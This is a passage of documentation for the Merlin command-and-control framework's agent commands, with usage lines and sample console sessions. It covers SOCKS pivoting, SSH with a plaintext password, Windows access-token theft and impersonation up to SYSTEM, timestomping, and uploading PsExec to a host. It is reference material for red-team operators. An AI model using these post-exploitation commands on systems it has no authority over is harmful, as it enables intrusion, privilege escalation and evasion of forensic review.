<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks list
[i]
        Agent                           Interface:Port
==========================================================
c1090dbc-f2f7-4d90-a241-86e0c0217786    127.0.0.1:9050
7be9defd-29b8-46ee-8d38-0f3805e9233f    [::]:9051
6d8a3a59-e484-40b3-977b-530b351106a6    192.168.1.100:9053
</pre></div>
</div>
</section>
<section id="socks-start">
<span id="id33"></span><h3>start<a class="headerlink" href="#socks-start" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">socks</span> <span class="pre">start</span> <span class="pre">[interface:]port</span> <span class="pre">agentID</span></code></p>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>SOCKS5 listeners do not require authentication. Control access accordingly using firewall rules or SSH tunnels.</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>In most cases you should only bind to the loopback adapter, 127.0.0.1, to prevent unintentionally exposing the port.</p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">start</span></code> command will start a SOCKS5 listener for the current agent. This command takes an optional third argument
of the interface and port, or just the port, that you want to bind the listener to. If a third argument is not provided
the listener will default to listen on <code class="docutils literal notranslate"><span class="pre">127.0.0.1:9050</span></code>.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks start
[-] Started SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9050
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][7be9defd-29b8-46ee-8d38-0f3805e9233f]» socks start 0.0.0.0:9051
[-] Started SOCKS listener for agent 7be9defd-29b8-46ee-8d38-0f3805e9233f on 0.0.0.0:9051
</pre></div>
</div>
</section>
<section id="socks-stop">
<span id="id34"></span><h3>stop<a class="headerlink" href="#socks-stop" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">socks</span> <span class="pre">stop</span> <span class="pre">[interface:]port</span> <span class="pre">agentID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">stop</span></code> command will stop and remove the SOCKS5 listener for the current agent.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks stop
[-] Successfully stopped SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9055
</pre></div>
</div>
</section>
</section>
<section id="ssh">
<h2>ssh<a class="headerlink" href="#ssh" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">username</span> <span class="pre">password</span> <span class="pre">host:port</span> <span class="pre">program</span> <span class="pre">[args]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">ssh</span></code> command connects to target host over the SSH protocol, executes the provided command, and returns the results.</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>This command is insecure by design because it does not validate the remote host’s public key</p>
</div>
<p><code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">&lt;username&gt;</span> <span class="pre">&lt;password&gt;</span> <span class="pre">&lt;host:port&gt;</span> <span class="pre">&lt;program&gt;</span> <span class="pre">[&lt;args&gt;]</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][fbef5b71-50bb-4d36-8a1b-2edf233eb578]» ssh rastley S3cretPassw0rd 192.168.100.123:22 /bin/sh -c \&quot;ip address show eth0\&quot;
[-] Created job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Connected to 192.168.100.123:22 at 192.168.100.123:22 with public key ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJytZseMSAsUU6OE2X4TC518fcF3yxgFYIgYp4+xT9pa9n5449gcsKT/eO3hx9NXAtyOHImg/Ff8kdWs52bU3SA=
0: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.70/24 brd 192.168.100.255 scope global dynamic noprefixroute eth0
       valid_lft 1781sec preferred_lft 1781sec
</pre></div>
</div>
</section>
<section id="status">
<h2>status<a class="headerlink" href="#status" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">status</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">status</span></code> command is used to simply print if the Merlin Agent is Active, Delayed, or Dead to the screen. This becomes useful when you come back to Merlin after a couple of hours or if you want to see if your shell has died.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
Active
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
</pre></div>
</div>
</section>
<section id="steal-token">
<h2>steal_token<a class="headerlink" href="#steal-token" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">steal_token</span> <span class="pre">PID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">steal_token</span></code> command steals and uses a Windows access token from another process.
This command is an alias for the <a class="reference internal" href="#token-steal"><span class="std std-ref">steal</span></a> command.</p>
<p>The steal command obtains a handle to a remote process’ access token, duplicates it through the DuplicateTokenEx
Windows API, and subsequently uses it to perform future post-exploitation commands.</p>
<p>References:</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex</a>”</p></li>
</ul>
</div></blockquote>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» steal_token 1320
[-] Created job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+] Successfully stole token from PID 1320 for user ACME\\Administrator with LogonID 0x39DF3C
</pre></div>
</div>
</section>
<section id="token">
<h2>token<a class="headerlink" href="#token" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">{make</span> <span class="pre">|</span> <span class="pre">privs</span> <span class="pre">|</span> <span class="pre">rev2self</span> <span class="pre">|</span> <span class="pre">steal</span> <span class="pre">|</span> <span class="pre">whoami}</span> <span class="pre">[options]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">token</span></code> command is used to perform various operations with Windows <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a>.
The following commands are available:</p>
<ul class="simple">
<li><p><a class="reference internal" href="#token-make"><span class="std std-ref">make</span></a></p></li>
<li><p><a class="reference internal" href="#token-privs"><span class="std std-ref">privs</span></a></p></li>
<li><p><a class="reference internal" href="#token-rev2self"><span class="std std-ref">rev2self</span></a></p></li>
<li><p><a class="reference internal" href="#token-steal"><span class="std std-ref">steal</span></a></p></li>
<li><p><a class="reference internal" href="#token-whoami"><span class="std std-ref">whoami</span></a></p></li>
</ul>
<p>Merlin keeps track of when a Windows access token was created or stolen. If there is a created or stolen token, it will be used with the following commands:</p>
<ul class="simple">
<li><p><a class="reference internal" href="#cd"><span class="std std-ref">cd</span></a></p></li>
<li><p><a class="reference internal" href="#download"><span class="std std-ref">download</span></a></p></li>
<li><p><a class="reference internal" href="#execute-assembly"><span class="std std-ref">execute-assembly</span></a></p></li>
<li><p><a class="reference internal" href="#execute-pe"><span class="std std-ref">execute-pe</span></a></p></li>
<li><p><a class="reference internal" href="#execute-shellcode"><span class="std std-ref">execute-shellcode</span></a></p></li>
<li><p><a class="reference internal" href="#invoke-assembly"><span class="std std-ref">invoke-assembly</span></a></p></li>
<li><p>minidump</p></li>
<li><p><a class="reference internal" href="#kill"><span class="std std-ref">kill</span></a></p></li>
<li><p><a class="reference internal" href="#ls"><span class="std std-ref">ls</span></a></p></li>
<li><p><a class="reference internal" href="#ps"><span class="std std-ref">ps</span></a></p></li>
<li><p><a class="reference internal" href="#rm"><span class="std std-ref">rm</span></a></p></li>
<li><p><a class="reference internal" href="#run"><span class="std std-ref">run</span></a></p></li>
<li><p><a class="reference internal" href="#shell"><span class="std std-ref">shell</span></a></p></li>
<li><p><a class="reference internal" href="#touch"><span class="std std-ref">touch</span></a></p></li>
<li><p><a class="reference internal" href="#upload"><span class="std std-ref">upload</span></a></p></li>
</ul>
<p>The following commands will make the Windows <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithTokenW</a> API call:</p>
<ul class="simple">
<li><p><a class="reference internal" href="#execute-assembly"><span class="std std-ref">execute-assembly</span></a></p></li>
<li><p><a class="reference internal" href="#execute-pe"><span class="std std-ref">execute-pe</span></a></p></li>
<li><p><a class="reference internal" href="#execute-shellcode"><span class="std std-ref">execute-shellcode</span></a></p></li>
<li><p><a class="reference internal" href="#run"><span class="std std-ref">run</span></a></p></li>
<li><p><a class="reference internal" href="#shell"><span class="std std-ref">shell</span></a></p></li>
</ul>
<section id="make">
<span id="token-make"></span><h3>make<a class="headerlink" href="#make" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">make</span> <span class="pre">DOMAIN\USERNAME</span> <span class="pre">PASSWORD</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">make</span></code> command is use to create a new Windows access token with the Windows <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw">LogonUserW</a> API call. The token is created with a type <code class="docutils literal notranslate"><span class="pre">9</span> <span class="pre">-</span> <span class="pre">NewCredentials</span></code> <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">logon type</a>. This is the equivalent of using <code class="docutils literal notranslate"><span class="pre">runas.exe</span> <span class="pre">/netonly</span></code>.</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>Type 9 - NewCredentials tokens only work for <strong>NETWORK</strong> authenticated activities</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Commands such as <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">whoami</span></code> will show the username for the process and not the created token due to the logon type, but will reflect the new Logon ID</p>
</div>
<p><code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">make</span> <span class="pre">&lt;DOMAIN\\User&gt;</span> <span class="pre">&lt;password&gt;</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token make ACME\\Administrator S3cretPassw0rd
[-] Created job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Successfully created a Windows access token for ACME\Administrator with a logon ID of 0xA703CF0
</pre></div>
</div>
</section>
<section id="privs">
<span id="token-privs"></span><h3>privs<a class="headerlink" href="#privs" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">privs</span> <span class="pre">[PID]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">privs</span></code> command enumerates the privilege associated with either the current process or a remote process.
If the current process has a created or stolen, and process ID argument is not provided, then the applied token’s
privileges will be enumerated.</p>
<p><code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">privs</span> <span class="pre">[&lt;PID&gt;]</span></code></p>
<p>Current process:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs
[-] Created job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Process ID 6892 access token integrity level: High, privileges (24):
        Privilege: SeIncreaseQuotaPrivilege, Attribute:
        Privilege: SeSecurityPrivilege, Attribute:
        Privilege: SeTakeOwnershipPrivilege, Attribute:
        Privilege: SeLoadDriverPrivilege, Attribute:
        Privilege: SeSystemProfilePrivilege, Attribute:
        Privilege: SeSystemtimePrivilege, Attribute:
        Privilege: SeProfileSingleProcessPrivilege, Attribute:
        Privilege: SeIncreaseBasePriorityPrivilege, Attribute:
        Privilege: SeCreatePagefilePrivilege, Attribute:
        Privilege: SeBackupPrivilege, Attribute:
        Privilege: SeRestorePrivilege, Attribute:
        Privilege: SeShutdownPrivilege, Attribute:
        Privilege: SeDebugPrivilege, Attribute: SE_PRIVILEGE_ENABLED
        Privilege: SeSystemEnvironmentPrivilege, Attribute:
        Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
        Privilege: SeRemoteShutdownPrivilege, Attribute:
        Privilege: SeUndockPrivilege, Attribute:
        Privilege: SeManageVolumePrivilege, Attribute:
        Privilege: SeImpersonatePrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
        Privilege: SeCreateGlobalPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
        Privilege: SeIncreaseWorkingSetPrivilege, Attribute:
        Privilege: SeTimeZonePrivilege, Attribute:
        Privilege: SeCreateSymbolicLinkPrivilege, Attribute:
        Privilege: SeDelegateSessionUserImpersonatePrivilege, Attribute:
</pre></div>
</div>
<p>Remote process:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs 8156
[-] Created job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Process ID 8156 access token integrity level: Low, privileges (2):
        Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
        Privilege: SeIncreaseWorkingSetPrivilege, Attribute:
</pre></div>
</div>
</section>
<section id="token-rev2self">
<span id="id35"></span><h3>rev2self<a class="headerlink" href="#token-rev2self" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">rev2self</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">rev2self</span></code> command leverages the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself">RevertToSelf</a>
Windows API function and releases, or drops, any access token that have been created or stolen.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>There is an unregistered <code class="docutils literal notranslate"><span class="pre">rev2self</span></code> command alias that can be use from the agent root menu prompt</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token rev2self
[-] Created job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Successfully reverted to self and dropped the impersonation token
</pre></div>
</div>
</section>
<section id="steal">
<span id="token-steal"></span><h3>steal<a class="headerlink" href="#steal" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">steal</span> <span class="pre">PID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">steal</span></code> command obtains a handle to a remote process’ access token, duplicates it through the
<a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex">DuplicateTokenEx</a>
Windows API, and subsequently uses it to perform future post-exploitation commands.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>There is an unregistered <code class="docutils literal notranslate"><span class="pre">steal_token</span></code> command alias that can be use from the agent root menu prompt</p>
</div>
<p><code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">steal</span> <span class="pre">&lt;PID&gt;</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token steal 1320
[-] Created job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Successfully stole token from PID 1320 for user ACME\Administrator with LogonID 0x39DF3C
</pre></div>
</div>
</section>
<section id="whoami">
<span id="token-whoami"></span><h3>whoami<a class="headerlink" href="#whoami" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">whoami</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">whoami</span></code> command leverages the Windows <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformaion</a> API call to return information
about both the process and thread Windows access token. This information includes:</p>
<ul class="simple">
<li><p>Username</p></li>
<li><p>Token ID</p></li>
<li><p>Logon ID</p></li>
<li><p>Privilege Count</p></li>
<li><p>Group Count</p></li>
<li><p>Token Type</p></li>
<li><p>Token Impersonation Level</p></li>
<li><p>Integrity Level</p></li>
</ul>
<p><code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">whoami</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token whoami
[-] Created job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Process (Primary) Token:
        User: ACME\rastley,Token ID: 0x9CA475E,Logon ID: 0x26C3A6,Privilege Count: 24,Group Count: 14,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High
Thread (Primary) Token:
        User: NT AUTHORITY\SYSTEM,Token ID: 0x9CC08EB,Logon ID: 0x3E7,Privilege Count: 28,Group Count: 4,Type: Primary,Impersonation Level: Impersonation,Integrity Level: System
</pre></div>
</div>
</section>
</section>
<section id="touch">
<span id="id36"></span><h2>touch<a class="headerlink" href="#touch" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">touch</span> <span class="pre">sourceFilePath</span> <span class="pre">destinationFilePath</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">touch</span></code> command is used to duplicate a timestamp from one file to another. This technique is also known as timestomp</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
[-] Created job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] -rw-rw-r-- 1 rastley rastley 0 Aug  2 20:11 /tmp/deleteMe.txt

Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch /etc/passwd /tmp/deleteMe.txt
[-] Created job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] File: /tmp/deleteMe.txt
Last modified and accessed time set to: 2020-09-16 07:05:18.245022776 -0400 EDT

Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
[-] Created job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] -rw-rw-r-- 1 rastley rastley 0 Sep 16  2020 /tmp/deleteMe.txt
</pre></div>
</div>
</section>
<section id="unlink">
<span id="id37"></span><h2>unlink<a class="headerlink" href="#unlink" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">unlink</span> <span class="pre">childAgentID</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">unlink</span></code> command tasks the parent Agent to disconnect from the child peer-to-peer Agent.
Depending on the child Agent type and configuration, the child Agent will remain running and listening for new connections.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» link list
[-] Created job pJpbkMqphK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-28T11:59:32Z
[-] Results of job pJpbkMqphK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-28T11:59:54Z
[+] Peer-to-Peer Links (1)
0. tcp-bind:e718067d-bf44-4715-aae3-8c1142114e3d:127.0.0.1:7777

Merlin[agent][d02fff99-e37d-4220-b430-a1c199ad3bcb]» unlink e718067d-bf44-4715-aae3-8c1142114e3d
[-] Created job uLhDoRVtPY for agent d02fff99-e37d-4220-b430-a1c199ad3bcb at 2023-07-28T12:00:27Z
[-] Results of job uLhDoRVtPY for agent d02fff99-e37d-4220-b430-a1c199ad3bcb at 2023-07-28T12:00:41Z
[+] Successfully unlinked from tcp-bind Agent e718067d-bf44-4715-aae3-8c1142114e3d and closed the network connection
</pre></div>
</div>
</section>
<section id="upload">
<span id="id38"></span><h2>upload<a class="headerlink" href="#upload" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">upload</span> <span class="pre">sourceFilePath</span> <span class="pre">destinationFilePath</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">upload</span></code> command is used to upload a file <em>from</em> the Merlin server <em>to</em> the host where the Merlin agent is running. The command is called by proving the location of the file on the Merlin server followed by the location to save the file on the host where the Merlin agent is running.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="uptime">
<h2>uptime<a class="headerlink" href="#uptime" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">uptime</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">uptime</span></code> command uses the Windows API GetTickCount64 method to determine how long the host has been running.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» uptime
[-] Created job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
System uptime: 853h31m14.921s
</pre></div>
</div>
</section>
<section id="verbose">
<h2>verbose<a class="headerlink" href="#verbose" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">verbose</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">verbose</span></code> command is a switch used to enable or disable verbose output to the console.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Merlin» verbose
[+] 2023-10-19T12:40:44Z Verbose output enabled
Merlin» verbose
[+] 2023-10-19T12:40:46Z Verbose output disabled
Merlin»
</pre></div>
</div>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="main.html" class="btn btn-neutral float-left" title="Main Menu" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="listeners.html" class="btn btn-neutral float-right" title="Listener Menu" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2023, Russel Van Tuyl (@Ne0nd0g).</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>